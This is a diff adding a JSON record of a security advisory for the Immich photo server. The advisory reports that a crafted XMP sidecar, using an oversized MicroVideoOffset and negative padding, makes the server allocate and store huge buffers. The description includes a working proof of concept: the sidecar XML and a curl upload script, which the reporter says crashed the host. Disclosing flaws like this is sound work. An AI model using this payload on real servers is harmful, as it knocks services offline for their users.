@@ -1,0 +1,47 @@
+{
+  "global": null,
+  "id": "GHSA-c9h4-ccvj-j2h2",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 6.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-400",
+      "CWE-770"
+    ],
+    "description": "### Summary\n\nAn authenticated, non-admin user can upload a JPEG with an XMP sidecar that claims the image contains an oversized motion-photo video. Negative padding makes Immich’s read position valid, but the server still allocates memory based on the unchecked  video length. It then saves the full buffer as a hidden video asset, amplifying a 20.9 KiB upload into 128 MiB of storage and about 480 MiB of server memory use in testing. Using larger values caused the host VM to crash.\n\n### Details\n\nAn authenticated, non-admin user can upload a 20.9 KiB JPEG with a crafted XMP sidecar. MicroVideoOffset=2147483647 makes Immich treat the video as nearly 2 GiB long. Negative container padding (-2147462747) makes the calculated read position zero, but Immich does not check that the claimed video length fits inside the JPEG. Immich allocates a buffer for the claimed length, then saves it as a hidden video asset.\r\n\r\nIn metadata.service.ts (immich-3.3.5/server/src/services/metadata.service.ts:696), Immich takes numeric MicroVideoOffset from the metadata as the video length. It calculates the read position as image size − length − padding, without checking that the requested range fits inside the image. A crafted negative ContainerDirectory.Item.Padding can make that position valid, while leaving the oversized length unchanged. Immich then allocates a buffer of that length with Buffer.alloc().\n\n### Proof of concept\n\n1-Deploy Immich and create a non-admin user account.\r\n2-Create a dummy JPEG with size of 310 bytes. The size of it could also be something else as long as position (position = image size - offset - padding) is equal to 0.\r\n3-Create the following sidecar:\r\n<?xpacket begin=\"﻿\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?>\r\n<x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"immich-audit\">\r\n  <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"\r\n    xmlns:Camera=\"http://ns.google.com/photos/1.0/camera/\"\r\n    xmlns:Container=\"http://ns.google.com/photos/1.0/container/\"\r\n    xmlns:Item=\"http://ns.google.com/photos/1.0/container/item/\">\r\n    <rdf:Description rdf:about=\"\"\r\n      Camera:MotionPhoto=\"1\"\r\n      Camera:MicroVideo=\"1\"\r\n      Camera:MicroVideoOffset=\"2147483647\">\r\n      <Container:Directory>\r\n        <rdf:Seq>\r\n          <rdf:li rdf:parseType=\"Resource\">\r\n            <Container:Item Item:Mime=\"image/jpeg\" Item:Semantic=\"Primary\" Item:Length=\"0\" />\r\n          </rdf:li>\r\n          <rdf:li rdf:parseType=\"Resource\">\r\n            <Container:Item Item:Mime=\"video/mp4\" Item:Semantic=\"MotionPhoto\" Item:Length=\"1\" Item:Padding=\"-2147483337\" />\r\n          </rdf:li>\r\n        </rdf:Seq>\r\n      </Container:Directory>\r\n    </rdf:Description>\r\n  </rdf:RDF>\r\n</x:xmpmeta>\r\n<?xpacket end=\"w\"?>\r\n4-Send the following request:\r\nset -o pipefail\r\nAPI='API LINK HERE'\r\nEMAIL='NON-ADMIN USER ACCOUNT EMAIL'\r\n\r\nread -r -s -p 'Password: ' IMMICH_PASSWORD\r\nprintf '\\n'\r\n\r\nTOKEN=\"$(jq -n --arg email \"$EMAIL\" --arg password \"$IMMICH_PASSWORD\" \\\r\n  '{email:$email,password:$password}' |\r\n  curl -fsS \"$API/auth/login\" \\\r\n    -H 'Content-Type: application/json' \\\r\n    --data-binary @- |\r\n  jq -r '.accessToken')\"\r\nunset IMMICH_PASSWORD\r\n\r\nSTAMP=\"$(date -u +'%Y-%m-%dT%H:%M:%S.000Z')\"\r\ncurl -fsS \"$API/assets\" \\\r\n  -H \"Authorization: Bearer $TOKEN\" \\\r\n  -F 'assetData=@motionphoto-finding-poc/dummy-image-2gb.jpg;type=image/jpeg' \\\r\n  -F 'sidecarData=@motionphoto-finding-poc/dummy-image-2gb.jpg.xmp;filename=dummy-image-2gb.jpg.xmp;type=application/rdf+xml' \\\r\n  -F \"fileCreatedAt=$STAMP\" \\\r\n  -F \"fileModifiedAt=$STAMP\" \\\r\n  -F 'filename=dummy-image-2gb.jpg'\r\n\r\nunset TOKEN\r\n\r\nDont forget to change the file names. You should be able to monitor memory usage. I managed to cause a crash with 2GBs. \n\n### Impact\n\nAn attacker with a normal user account can cause the host to go down.",
+    "ghsa_id": "GHSA-c9h4-ccvj-j2h2",
+    "html_url": "https://github.com/immich-app/immich/security/advisories/GHSA-c9h4-ccvj-j2h2",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-c9h4-ccvj-j2h2"
+      }
+    ],
+    "published_at": "2026-11-10T18:44:59Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "Unbounded motion-photo offset causes memory and disk exhaustion",
+    "updated_at": "2026-11-10T18:44:59Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "immich-app/immich"
+        },
+        "patched_versions": "v3.4.0",
+        "vulnerable_version_range": "<= v3.3.6"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "immich-app/immich"
+}
